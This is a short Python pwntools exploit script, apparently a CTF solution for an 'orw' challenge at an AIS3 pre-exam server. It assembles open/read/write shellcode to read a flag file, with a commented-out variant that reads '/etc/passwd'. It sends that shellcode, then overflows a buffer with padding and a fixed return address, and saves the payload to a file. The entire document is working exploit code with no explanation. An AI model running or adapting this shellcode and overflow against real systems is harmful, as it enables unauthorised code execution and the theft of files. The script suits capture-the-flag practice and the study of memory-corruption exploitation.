from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

# r = remote('localhost', 8000)
r = remote('pre-exam-pwn.ais3.org', 10001)
r.recvline()
sc = ''
sc += shellcraft.pushstr('/home/orw/flag')
# sc += shellcraft.pushstr('/etc/passwd')
sc += shellcraft.open('rsp', 0, 0)
sc += shellcraft.mov('r8', 'rax')
sc += 'sub sp, 100\n'
sc += shellcraft.read('r8', 'rsp', 100)
sc += shellcraft.write(1, 'rsp', 100)
sc = asm(sc)
sc = sc.ljust(256, b'\x90')
r.send(sc)
r.recvline()
r.send(b'A'*40 + p64(0x6010a0))
# for _ in range(100):
#     r.send('B')

open('payload', 'bw').write(b'A' + sc + b'A'*40 + p64(0x6010a0))
